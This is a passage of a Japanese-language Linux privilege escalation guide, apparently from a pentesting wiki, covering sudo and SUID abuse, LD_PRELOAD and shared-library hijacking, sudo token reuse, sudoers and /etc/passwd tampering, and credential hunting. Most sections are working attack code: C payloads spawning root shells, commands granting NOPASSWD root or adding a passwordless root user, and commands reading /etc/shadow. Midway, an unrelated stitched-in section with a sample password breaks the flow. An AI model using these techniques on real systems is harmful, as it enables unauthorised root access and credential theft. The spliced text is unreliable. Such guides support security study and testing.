一部の Linux バージョンは、**UID > INT_MAX** のユーザーが特権を昇格できるバグの影響を受けていました。More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### グループ

root 権限を付与する可能性のあるグループの**メンバーかどうか**を確認してください:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### クリップボード

可能であればクリップボード内に興味深いものがないか確認してください
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

環境の **任意のパスワードを知っている場合は**、そのパスワードを使って**各ユーザーとしてログインしてみてください。**

### Su Brute

大量のノイズを出すことを気にせず、`su` と `timeout` バイナリが対象ホストに存在する場合は、[su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は `-a` パラメータでユーザーを brute-force することも試みます。

## Writable PATH の悪用

### $PATH

$PATH のあるフォルダに**書き込みができることが分かった場合**、その書き込み可能なフォルダに別のユーザー（理想的には root）によって実行されるコマンド名と同じ名前の**backdoor を作成する**ことで権限を昇格できる可能性があります。ただし、そのコマンドが**$PATH 内であなたの書き込みフォルダより前にあるフォルダから読み込まれない**ことが条件です。

### SUDO and SUID

sudo を用いて実行できるコマンドがあるか、あるいはコマンドが suid ビットを持っている可能性があります。次のように確認してください：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
いくつかの**予期しないコマンドはファイルを読み書きしたり、コマンドを実行したりすることさえあります。** 例えば：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudoの設定により、ユーザーはパスワードを知らなくても別のユーザーの権限でコマンドを実行できる場合がある。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例では、ユーザー `demo` が `root` として `vim` を実行できます。root ディレクトリに ssh キーを追加するか、`sh` を呼び出すことで shell を取得するのは容易です。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブにより、ユーザーは何かを実行する際に **set an environment variable** ことができます:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**HTB machine Admirerをベースにした**もので、スクリプトをrootとして実行している間に任意のPythonライブラリをロードできる**PYTHONPATH hijacking**に**脆弱でした**:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV が sudo env_keep により保持される → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- なぜ動くか: 非対話シェルでは、Bash は `$BASH_ENV` を評価し、ターゲットスクリプトを実行する前にそのファイルを source します。多くの sudo ルールはスクリプトやシェルラッパーの実行を許可します。sudo が `BASH_ENV` を保持している場合、あなたのファイルは root 権限で source されます。

- 要件:
- 実行可能な sudo ルール（非対話的に `/bin/bash` を呼び出す任意のターゲット、または任意の bash スクリプト）。
- `BASH_ENV` が `env_keep` に含まれていること（`sudo -l` で確認）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- ハードニング:
- `env_keep` から `BASH_ENV`（および `ENV`）を削除し、`env_reset` を推奨する。
- sudo で許可されたコマンドに対する shell wrappers を避け、可能な限り最小のバイナリを使用する。
- 保持された環境変数が使用された場合の sudo の I/O ロギングとアラートを検討する。

### Sudo 実行バイパスの経路

**Jump** で他のファイルを読むか、**symlinks** を使用する。例えば sudoers ファイルでは: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
もし**wildcard**が使用されている（\*）場合は、さらに簡単です:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID バイナリ（コマンドのパスがない場合）

もし **sudo permission** が単一のコマンドに対してパスを指定せずに与えられている場合: _hacker10 ALL= (root) less_、PATH variable を変更することでこれを悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
このテクニックは、**suid** バイナリが**パスを指定せずに別のコマンドを実行する場合（常に _**strings**_ で奇妙な SUID バイナリの内容を確認してください）**にも使用できます。

[Payload examples to execute.](payloads-to-execute.md)

### SUID バイナリ（コマンドのパス指定あり）

もし**suid** バイナリが**パスを指定して別のコマンドを実行する**場合、suid ファイルが呼び出しているコマンド名で**export a function** を作成してエクスポートしてみることができます。

例えば、もし suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出す場合、コマンド名に対応する関数を作成して export してみてください:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Then, when you call the suid binary, this function will be executed

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:

- The loader disregards **LD_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
- For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.

Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env_keep+=LD_PRELOAD**. This configuration allows the **LD_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
次の名前で保存: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に **それをコンパイル** してください:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**escalate privileges** を実行する。
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 同様の privesc は、攻撃者が **LD_LIBRARY_PATH** env variable を制御している場合に悪用される可能性があります。攻撃者はライブラリが検索されるパスを制御できるためです。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

通常と異なるように見える**SUID**権限を持つバイナリに遭遇した場合、正しく**.so**ファイルを読み込んでいるか確認するのが良い習慣です。これを確認するには、次のコマンドを実行します:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_のようなエラーに遭遇した場合、悪用の可能性が示唆されます。

これを悪用するには、Cファイル、例えば_"/path/to/.config/libcalc.c"_を作成し、次のコードを含めます:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイルのパーミッションを操作して権限を昇格させ、昇格した権限でシェルを実行することを目的としています。

上記のCファイルを共有オブジェクト (.so) ファイルにコンパイルするには、次のようにします:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受けた SUID バイナリを実行すると exploit が発動し、システムが侵害される可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
書き込み可能な folder から library をロードする SUID binary を見つけたので、その folder に必要な名前の library を作成しましょう：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが発生した場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
つまり、生成したライブラリには `a_function_name` という名前の関数が必要です。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限を回避するために悪用できる Unix バイナリをまとめたキュレートされたリストです。 [**GTFOArgs**](https://gtfoargs.github.io/) は同様のもので、コマンドに対して**引数のみを注入できる**場合のケース向けです。

このプロジェクトは、Unix バイナリの正規機能を収集しており、これらは制限されたシェルからの脱出、権限昇格や権限維持、ファイル転送、spawn bind and reverse shells、その他のポストエクスプロイト作業を助けるために悪用できます。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` にアクセスできる場合、ツール [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使用して、任意の sudo ルールを悪用する方法が見つかるか確認できます。

### Reusing Sudo Tokens

パスワードは知らないが**sudo access**がある場合、**sudo コマンドの実行を待ち、そのセッショントークンをハイジャックする**ことで権限を昇格できます。

権限昇格の要件:

- あなたは既にユーザー _sampleuser_ としてシェルを持っている
- _sampleuser_ は**過去15分以内に `sudo` を使用して**何かを実行している（デフォルトでこれはパスワードを入力せずに sudo を使える sudo トークンの有効期間です）
- `cat /proc/sys/kernel/yama/ptrace_scope` が 0 である
- `gdb` にアクセス可能である（アップロードできる必要がある）

（一時的に `ptrace_scope` を有効にするには `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を実行するか、または `/etc/sysctl.d/10-ptrace.conf` を恒久的に変更して `kernel.yama.ptrace_scope = 0` を設定します）

これらの要件がすべて満たされている場合、**次のツールを使って権限を昇格できます：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) は _/tmp_ にバイナリ `activate_sudo_token` を作成します。これを使用して**セッション内の sudo トークンを有効化**できます（自動的に root シェルは取得できないので、`sudo su` を実行してください）:
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **2番目の exploit** (`exploit_v2.sh`) は _/tmp_ **root 所有で setuid の sh shell** を作成します
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- この **3番目の exploit** (`exploit_v3.sh`) は **sudoers file を作成し**、**sudo tokens を永続化して全ユーザが sudo を使用できるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダ、またはその中に作成されたファイルのいずれかに**write permissions**がある場合、バイナリ[**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)を使用して**user と PID のための sudo token を作成**できます。\
例えば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、PID 1234 でその user として shell を持っている場合、password を知らなくても**sudo privileges を取得**できます。以下のように実行します:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` と `/etc/sudoers.d` 内のファイルは、誰が `sudo` を使えるかとその方法を設定します。これらのファイルは**デフォルトでは user root および group root のみが読み取り可能**です。\
**もし**このファイルを**読み取る**ことができれば、**興味深い情報を得る**ことができるかもしれません。そして任意のファイルに**書き込み**ができれば**escalate privileges**できます。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込み権限があれば、この権限を悪用できます。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` バイナリの代替として、OpenBSD の `doas` などがあります。設定は `/etc/doas.conf` を確認してください。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

もし**ユーザーが通常マシンに接続して`sudo`を使用する**ことが分かっていて、そのユーザーコンテキストでシェルを得ている場合、あなたは**新しい sudo 実行可能ファイルを作成**して先に自分のコードを root として実行させ、その後にユーザーのコマンドを実行させることができます。次に、ユーザーコンテキストの**$PATHを変更**（例：.bash_profile に新しいパスを追加）しておけば、ユーザーが sudo を実行したときにあなたの sudo 実行ファイルが実行されます。

注意：ユーザーが別のシェル（bash以外）を使っている場合、同様に新しいパスを追加するために他のファイルを変更する必要があります。例えば[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` を変更します。別の例は [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) にあります。

Or running something like:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は、**読み込まれる設定ファイルがどこから来るか**を示します。通常、このファイルには次のパスが含まれます: `include /etc/ld.so.conf.d/*.conf`

つまり、`/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれます。これらの設定ファイルは、**ライブラリが検索される他のフォルダ**を指しています。例えば、`/etc/ld.so.conf.d/libc.conf` の内容が `/usr/local/lib` であれば、**システムは `/usr/local/lib` の中でライブラリを検索する**ということになります。

もし何らかの理由で `/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` が指す任意のフォルダにユーザーが書き込み権限を持っている場合、escalate privileges が可能になることがあります.\

以下のページで **how to exploit this misconfiguration** を参照してください:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib を `/var/tmp/flag15/` にコピーすると、`RPATH` 変数で指定されている通り、その場所でプログラムによって使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に、`/var/tmp` に悪意のあるライブラリを作成します: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities はプロセスに対して利用可能な root 権限の**サブセットを提供します**。これは実質的に root の権限を**より小さく識別可能な単位に分解**することを意味します。これらの各単位は個別にプロセスへ付与可能です。こうして権限の全体集合が縮小され、悪用のリスクが低減します。\
以下のページを読んで、**capabilities とそれを悪用する方法の詳細を学んでください**：


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

ディレクトリでは、**"execute" ビット**は対象ユーザが **"cd"** でフォルダに移動できることを意味します。\
**"read"** ビットはユーザが**ファイルを一覧表示（list）**できることを意味し、**"write"** ビットはユーザが**ファイルを削除（delete）および新規作成（create）**できることを意味します。

## ACLs

Access Control Lists (ACLs) は任意の権限の二次層を表し、従来の ugo/rwx 権限を**上書きできる**可能性があります。これらの権限は所有者やグループの一員でない特定のユーザに対してアクセス権を許可または拒否することで、ファイルやディレクトリのアクセス制御を強化します。このレベルの**細粒度はより正確なアクセス管理を実現**します。詳細は[**こちら**](https://linuxconfig.org/how-to-manage-acls-on-linux)を参照してください。

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**取得** システム上の特定のACLsを持つファイル:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 開いている shell sessions

**古いバージョン**では、別のユーザー（**root**）の**shell** sessionを**hijack**できることがあります。\
**最新バージョン**では、**自身のユーザー**の**screen** sessionsに**connect**できるようになっています。とはいえ、**session内の興味深い情報**が見つかることがあります。

### screen sessions hijacking

**screen sessions を一覧表示**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**セッションにアタッチする**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

これは **old tmux versions** の問題でした。権限のないユーザーとして、root によって作成された tmux (v2.1) セッションをハイジャックすることはできませんでした。

**tmux セッションを一覧表示する**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**セッションにアタッチする**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日までの間にDebian系 (Ubuntu, Kubuntu, etc) で生成されたすべての SSL および SSH キーはこのバグの影響を受ける可能性があります。\\
このバグはこれらの OS 上で新しい ssh キーを作成する際に発生し、**わずか 32,768 通りのバリエーションしかなかった**ためです。つまり、全ての可能性を計算でき、**ssh public key を持っていれば対応する private key を検索できます**。計算済みの可能性はここで確認できます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH の興味深い設定値

- **PasswordAuthentication:** パスワード認証が許可されているかどうかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** public key authentication が許可されているかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: password authentication が許可されている場合、サーバーが空のパスワード文字列を持つアカウントでのログインを許可するかどうかを指定します。デフォルトは `no` です。

### PermitRootLogin

root が ssh でログインできるかどうかを指定します。デフォルトは `no` です。可能な値:

- `yes`: root は password と private key の両方でログインできます
- `without-password` or `prohibit-password`: root は private key のみでログインできます
- `forced-commands-only`: root は private key を使用し、かつコマンドの options が指定されている場合のみログインできます
- `no` : 許可しない

### AuthorizedKeysFile

ユーザー認証に使用できる public keys を含むファイルを指定します。`%h` のようなトークンを含めることができ、これはユーザーのホームディレクトリに置き換えられます。**絶対パス**（`/` で始まる）や**ユーザーのホームからの相対パス**を指定できます。例えば:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー「**testusername**」の**private** keyでログインしようとした場合、sshがあなたのキーのpublic keyを`/home/testusername/.ssh/authorized_keys`および`/home/testusername/access`にあるものと比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwardingにより、**use your local SSH keys instead of leaving keys**（passphrasesなしでサーバーに鍵を置いたままにする代わりにローカルのSSH keysを使うこと）が可能になります。つまり、sshで**jump**して**to a host**し、そこからさらに**jump to another** hostへ移動して、最初のホストにある**key**を**using**して接続できます。

このオプションは `$HOME/.ssh.config` に次のように設定してください：
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### プロファイルファイル

The file `/etc/profile` and the files under `/etc/profile.d/` are **scripts that are executed when a user runs a new shell**. Therefore, if you can **write or modify any of them you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
不審なプロファイルスクリプトが見つかった場合は、**機密情報**が含まれていないか確認するべきです。

### Passwd/Shadow ファイル

OSによっては、`/etc/passwd` と `/etc/shadow` ファイルが別名で存在したり、バックアップが残っている場合があります。したがって、これらを**すべて見つける**ことと、**読み取れるか確認する**ことで、ファイル内に**ハッシュがあるかどうか**を確認することを推奨します:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等のファイル）内に**password hashes**が見つかることがあります。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、次のコマンドのいずれかでパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
# Privilege Escalation

このドキュメントは、Linux 環境における Privilege Escalation に関連する技術や手法、検査時の注意点をまとめたものです。ここでは一般的な観点と参考箇所へのリンクを示します。具体的なコマンドやスクリプト、脆弱性の悪用方法などは別ファイルに分けて記載しています。

目的:
- 権限昇格の検出と緩和策を理解する
- よくある誤設定や脆弱性パターンを認識する
- セキュリティ評価時に役立つチェックリストを提供する

注意:
- 実環境での検査は必ず許可を得てから実施してください。
- 提示するコマンドはサンプルです。実行前に内容を確認してください。

ユーザー `hacker` を追加する
-------------------------

以下は新しいユーザー `hacker` を作成し、生成したパスワードを設定する例です。コード部分は翻訳していません。

生成されたパスワード:
V4r$8qLz9Nw2@xY1

コマンド例:
```bash
# ユーザーを追加
sudo useradd -m -s /bin/bash hacker

# パスワードを設定（生成済みのパスワードを使用）
echo 'hacker:V4r$8qLz9Nw2@xY1' | sudo chpasswd

# 必要に応じて sudo グループに追加
sudo usermod -aG sudo hacker
```

パスワードは一例です。実運用ではより安全な方法で生成・管理し、初回ログイン時にパスワード変更を促してください。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `su` コマンドを使って `hacker:hacker` を使用できます

別の方法として、以下の行を使ってパスワードなしのダミーユーザーを追加できます。\
警告: 現在のマシンのセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意: BSD プラットフォームでは `/etc/passwd` は `/etc/pwd.db` と `/etc/master.passwd` にあり、また `/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

いくつかの機密ファイルに**書き込みできるか**を確認してください。例えば、いくつかの**サービス設定ファイル**に書き込めますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが**tomcat**サーバを実行しており、**/etc/systemd/内のTomcatサービス構成ファイルを変更できる場合、**次の行を変更できます：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
あなたの backdoor は次回 tomcat が起動したときに実行されます。

### フォルダを確認

次のフォルダにはバックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (おそらく最後のものは読み取れないでしょうが、試してみてください)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 直近数分で変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB ファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH内のスクリプト/バイナリ**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードが含まれる既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを読んでください。これは **パスワードを含む可能性がある複数のファイル** を検索します。\
**もう一つの興味深いツール** は: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) で、Windows、Linux & Mac のローカルコンピュータに保存された多数のパスワードを取得するためのオープンソースアプリケーションです。

### ログ

ログを読めるなら、**その中に興味深い／機密情報を見つけられる可能性があります**。ログがより奇妙であればあるほど、より興味深い（おそらく）でしょう。\
また、いくつかの **"bad" に設定された（backdoored?）監査ログ** は、投稿で説明されているように監査ログ内に **パスワードを記録する** ことを許す場合があります: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
